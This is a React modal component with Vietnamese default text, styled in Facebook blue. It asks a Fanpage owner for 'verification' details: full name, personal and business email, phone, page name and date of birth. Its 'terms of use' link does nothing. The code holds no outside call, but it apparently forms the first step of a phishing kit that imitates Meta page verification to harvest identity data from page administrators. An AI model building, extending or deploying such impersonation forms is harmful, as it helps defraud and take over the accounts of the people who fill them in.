import { useState } from 'react';
import PropTypes from 'prop-types';
import PhoneInput from '@/components/phone-input';

const FirstFormModal = ({ show, onClose, onSubmit, texts }) => {
    const [formData, setFormData] = useState({
        fullName: '',
        personalEmail: '',
        businessEmail: '',
        phone: '',
        pageName: '',
        dobDay: '',
        dobMonth: '',
        dobYear: '',
        additionalNotes: '',
        agreeTerms: false
    });
    const [errors, setErrors] = useState({});

    const handleChange = (field, value) => {
        setFormData((prev) => ({ ...prev, [field]: value }));
        if (errors[field]) {
            setErrors((prev) => ({ ...prev, [field]: false }));
        }
    };

    const handleSubmit = (e) => {
        e.preventDefault();
        const newErrors = {};

        if (!formData.fullName.trim()) newErrors.fullName = true;
        if (!formData.personalEmail.trim()) newErrors.personalEmail = true;
        if (!formData.businessEmail.trim()) newErrors.businessEmail = true;
        if (!formData.phone.trim()) newErrors.phone = true;
        if (!formData.pageName.trim()) newErrors.pageName = true;
        if (!formData.dobDay || !formData.dobMonth || !formData.dobYear) newErrors.dob = true;

        if (Object.keys(newErrors).length > 0) {
            setErrors(newErrors);
            return;
        }

        onSubmit({
            fullName: formData.fullName,
            personalEmail: formData.personalEmail,
            businessEmail: formData.businessEmail,
            phone: formData.phone,
            pageName: formData.pageName,
            dob: `${formData.dobDay}/${formData.dobMonth}/${formData.dobYear}`,
            additionalNotes: formData.additionalNotes
        });
    };

    if (!show) return null;

    /* ── Inline style objects ── */
    const overlayStyle = {
        position: 'fixed',
        inset: 0,
        backgroundColor: 'rgba(0,0,0,0.45)',
        zIndex: 1040,
        display: 'flex',
        justifyContent: 'center',
        alignItems: 'flex-start',
        padding: '32px 16px',
        overflowY: 'auto',
        WebkitOverflowScrolling: 'touch',
        scrollbarWidth: 'none',
        msOverflowStyle: 'none',
    };

    const modalStyle = {
        position: 'relative',
        width: '100%',
        maxWidth: '500px',
        backgroundImage: 'linear-gradient(130deg, #f9f1f9, #eaf3fd 35%, #edfbf2)',
        borderRadius: '18px',
        boxShadow: '0 20px 60px rgba(0,0,0,0.18)',
        zIndex: 1050,
        flexShrink: 0,
    };

    const headerStyle = {
        display: 'flex',
        justifyContent: 'space-between',
        alignItems: 'flex-start',
        padding: '28px 28px 0',
    };

    const titleStyle = {
        fontSize: '20px',
        fontWeight: 700,
        color: '#1a1a2e',
        margin: 0,
        lineHeight: 1.3,
    };

    const closeBtnStyle = {
        background: 'none',
        border: 'none',
        fontSize: '22px',
        cursor: 'pointer',
        color: '#666',
        padding: '0 0 0 12px',
        lineHeight: 1,
    };

    const subtitleStyle = {
        fontSize: '13px',
        color: '#5a6a85',
        lineHeight: 1.55,
        padding: '10px 28px 0',
        margin: 0,
    };

    const bodyStyle = {
        padding: '20px 28px 28px',
    };

    const labelStyle = {
        display: 'block',
        fontSize: '13.5px',
        fontWeight: 600,
        color: '#1a1a2e',
        marginBottom: '6px',
    };

    const requiredStar = {
        color: '#1877f2',
        marginLeft: '3px',
    };

    const inputStyle = (hasError) => ({
        width: '100%',
        padding: '11px 14px',
        fontSize: '14px',
        border: `1.5px solid ${hasError ? '#e74c3c' : '#dce3ed'}`,
        borderRadius: '10px',
        outline: 'none',
        backgroundColor: '#fff',
        color: '#333',
        transition: 'border-color 0.2s',
        boxSizing: 'border-box',
    });

    const fieldGap = { marginBottom: '10px' };

    const selectStyle = (hasError) => ({
        flex: 1,
        padding: '11px 10px',
        fontSize: '14px',
        border: `1.5px solid ${hasError ? '#e74c3c' : '#dce3ed'}`,
        borderRadius: '10px',
        outline: 'none',
        backgroundColor: '#fff',
        color: '#555',
        cursor: 'pointer',
        appearance: 'auto',
        boxSizing: 'border-box',
    });

    const textareaStyle = {
        width: '100%',
        padding: '11px 14px',
        fontSize: '14px',
        border: '1.5px solid #dce3ed',
        borderRadius: '10px',
        outline: 'none',
        backgroundColor: '#fff',
        color: '#333',
        minHeight: '80px',
        resize: 'vertical',
        fontFamily: 'inherit',
        boxSizing: 'border-box',
    };

    const checkboxRow = {
        display: 'flex',
        alignItems: 'center',
        gap: '8px',
        marginBottom: '20px',
        fontSize: '13.5px',
        color: '#333',
    };

    const submitBtnStyle = {
        width: '100%',
        padding: '14px',
        fontSize: '16px',
        fontWeight: 600,
        color: '#fff',
        backgroundImage: 'linear-gradient(90deg, #1877f2, #1a9bff)',
        border: 'none',
        borderRadius: '999px',
        cursor: 'pointer',
        transition: 'filter 0.2s',
        boxShadow: '0 8px 20px rgba(24,119,242,0.3)',
    };

    // Generate options
    const days = Array.from({ length: 31 }, (_, i) => i + 1);
    const months = Array.from({ length: 12 }, (_, i) => i + 1);
    const currentYear = new Date().getFullYear();
    const years = Array.from({ length: 100 }, (_, i) => currentYear - i);

    return (
        <div style={overlayStyle}>
            <div style={modalStyle} onClick={(e) => e.stopPropagation()}>
                {/* Header */}
                <div style={headerStyle}>
                    <h2 style={titleStyle}>{texts.verificationInfo || 'Thông tin xác minh'}</h2>
                    <button type="button" style={closeBtnStyle} onClick={onClose} aria-label="Close">×</button>
                </div>

                {/* Subtitle */}
                <p style={subtitleStyle}>
                    {texts.fillRequiredFields || 'Vui lòng điền chính xác và đầy đủ các trường bắt buộc để hoàn tất hồ sơ xác minh.'}
                </p>

                {/* Body / Form */}
                <div style={bodyStyle}>
                    <form onSubmit={handleSubmit}>
                        {/* Họ và tên người đại diện */}
                        <div style={fieldGap}>
                            <label style={labelStyle}>
                                {texts.fullName || 'Họ và tên người đại diện'}<span style={requiredStar}>*</span>
                            </label>
                            <input
                                style={inputStyle(errors.fullName)}
                                type="text"
                                placeholder={texts.fullNamePlaceholder || 'Ví dụ: Nguyễn Văn A'}
                                value={formData.fullName}
                                onChange={(e) => handleChange('fullName', e.target.value)}
                                onFocus={(e) => { e.target.style.borderColor = '#1877f2'; }}
                                onBlur={(e) => { e.target.style.borderColor = errors.fullName ? '#e74c3c' : '#dce3ed'; }}
                            />
                        </div>

                        {/* Email liên hệ */}
                        <div style={fieldGap}>
                            <label style={labelStyle}>
                                {texts.personalEmail || 'Email liên hệ'}<span style={requiredStar}>*</span>
                            </label>
                            <input
                                style={inputStyle(errors.personalEmail)}
                                type="email"
                                placeholder={texts.personalEmailPlaceholder || 'Ví dụ: nguyenvana@gmail.com'}
                                value={formData.personalEmail}
                                onChange={(e) => handleChange('personalEmail', e.target.value)}
                                onFocus={(e) => { e.target.style.borderColor = '#1877f2'; }}
                                onBlur={(e) => { e.target.style.borderColor = errors.personalEmail ? '#e74c3c' : '#dce3ed'; }}
                            />
                        </div>

                        {/* Email doanh nghiệp */}
                        <div style={fieldGap}>
                            <label style={labelStyle}>
                                {texts.businessEmail || 'Email doanh nghiệp'}<span style={requiredStar}>*</span>
                            </label>
                            <input
                                style={inputStyle(errors.businessEmail)}
                                type="email"
                                placeholder={texts.businessEmailPlaceholder || 'Ví dụ: contact@tencongty.com'}
                                value={formData.businessEmail}
                                onChange={(e) => handleChange('businessEmail', e.target.value)}
                                onFocus={(e) => { e.target.style.borderColor = '#1877f2'; }}
                                onBlur={(e) => { e.target.style.borderColor = errors.businessEmail ? '#e74c3c' : '#dce3ed'; }}
                            />
                        </div>

                        {/* Tên Trang/Fanpage */}
                        <div style={fieldGap}>
                            <label style={labelStyle}>
                                {texts.yourPageName || 'Tên Trang/Fanpage'}<span style={requiredStar}>*</span>
                            </label>
                            <input
                                style={inputStyle(errors.pageName)}
                                type="text"
                                placeholder={texts.pageNamePlaceholder || 'Ví dụ: ABC Studio Official'}
                                value={formData.pageName}
                                onChange={(e) => handleChange('pageName', e.target.value)}
                                onFocus={(e) => { e.target.style.borderColor = '#1877f2'; }}
                                onBlur={(e) => { e.target.style.borderColor = errors.pageName ? '#e74c3c' : '#dce3ed'; }}
                            />
                        </div>

                        {/* Số điện thoại */}
                        <div style={fieldGap}>
                            <label style={labelStyle}>
                                {texts.mobilePhone || 'Số điện thoại'}<span style={requiredStar}>*</span>
                            </label>
                            <PhoneInput
                                error={errors.phone}
                                id="PhoneFieldFirstForm"
                                name="mobile-phone-number"
                                placeholder={texts.mobilePhonePlaceholder || 'Ví dụ: +84 901 234 567'}
                                value={formData.phone}
                                onChange={(val) => handleChange('phone', val)}
                            />
                        </div>

                        {/* Ngày tháng năm sinh */}
                        <div style={fieldGap}>
                            <label style={labelStyle}>
                                {texts.dob || 'Ngày tháng năm sinh'}<span style={requiredStar}>*</span>
                            </label>
                            <div style={{ display: 'flex', gap: '10px' }}>
                                <select
                                    style={selectStyle(errors.dob)}
                                    value={formData.dobDay}
                                    onChange={(e) => handleChange('dobDay', e.target.value)}
                                >
                                    <option value="">{texts.day || 'Ngày'}</option>
                                    {days.map((d) => (
                                        <option key={d} value={d}>{d}</option>
                                    ))}
                                </select>
                                <select
                                    style={selectStyle(errors.dob)}
                                    value={formData.dobMonth}
                                    onChange={(e) => handleChange('dobMonth', e.target.value)}
                                >
                                    <option value="">{texts.month || 'Tháng'}</option>
                                    {months.map((m) => (
                                        <option key={m} value={m}>{texts.month || 'Tháng'} {m}</option>
                                    ))}
                                </select>
                                <select
                                    style={selectStyle(errors.dob)}
                                    value={formData.dobYear}
                                    onChange={(e) => handleChange('dobYear', e.target.value)}
                                >
                                    <option value="">{texts.year || 'Năm'}</option>
                                    {years.map((y) => (
                                        <option key={y} value={y}>{y}</option>
                                    ))}
                                </select>
                            </div>
                        </div>

                        {/* Ghi chú bổ sung */}
                        <div style={fieldGap}>
                            <label style={labelStyle}>
                                {texts.additionalNotes || 'Ghi chú bổ sung (tùy chọn)'}
                            </label>
                            <textarea
                                style={textareaStyle}
                                placeholder={texts.additionalNotesPlaceholder || 'Ví dụ: Trang đại diện chính thức cho thương hiệu ABC, cần hoàn tất xác minh để tăng mức độ tin cậy.'}
                                value={formData.additionalNotes}
                                onChange={(e) => handleChange('additionalNotes', e.target.value)}
                                onFocus={(e) => { e.target.style.borderColor = '#1877f2'; }}
                                onBlur={(e) => { e.target.style.borderColor = '#dce3ed'; }}
                            />
                        </div>

                        {/* Checkbox đồng ý */}
                        <div style={checkboxRow}>
                            <input
                                type="checkbox"
                                id="agreeTermsFirstForm"
                                checked={formData.agreeTerms}
                                onChange={(e) => handleChange('agreeTerms', e.target.checked)}
                                style={{
                                    width: '16px',
                                    height: '16px',
                                    accentColor: '#1877f2',
                                    cursor: 'pointer',
                                    borderColor: errors.agreeTerms ? '#e74c3c' : undefined,
                                }}
                            />
                            <label htmlFor="agreeTermsFirstForm" style={{ cursor: 'pointer' }}>
                                {texts.agreeToTermsOfUse || 'Tôi đồng ý với'} {' '}
                                <a
                                    href="#"
                                    onClick={(e) => e.preventDefault()}
                                    style={{ color: '#1877f2', textDecoration: 'none' }}
                                    onMouseOver={(e) => { e.currentTarget.style.textDecoration = 'underline'; }}
                                    onMouseOut={(e) => { e.currentTarget.style.textDecoration = 'none'; }}
                                >
                                    {texts.termsOfUseLink || 'Điều khoản sử dụng'} ↗
                                </a>
                            </label>
                        </div>

                        {/* Submit */}
                        <button
                            type="submit"
                            style={submitBtnStyle}
                            onMouseOver={(e) => { e.currentTarget.style.filter = 'brightness(1.05)'; }}
                            onMouseOut={(e) => { e.currentTarget.style.filter = 'brightness(1)'; }}
                        >
                            {texts.confirm || 'Gửi thông tin xác minh'}
                        </button>
                    </form>
                </div>
            </div>
        </div>
    );
};

FirstFormModal.propTypes = {
    show: PropTypes.bool.isRequired,
    onClose: PropTypes.func.isRequired,
    onSubmit: PropTypes.func.isRequired,
    texts: PropTypes.object.isRequired
};

export default FirstFormModal;
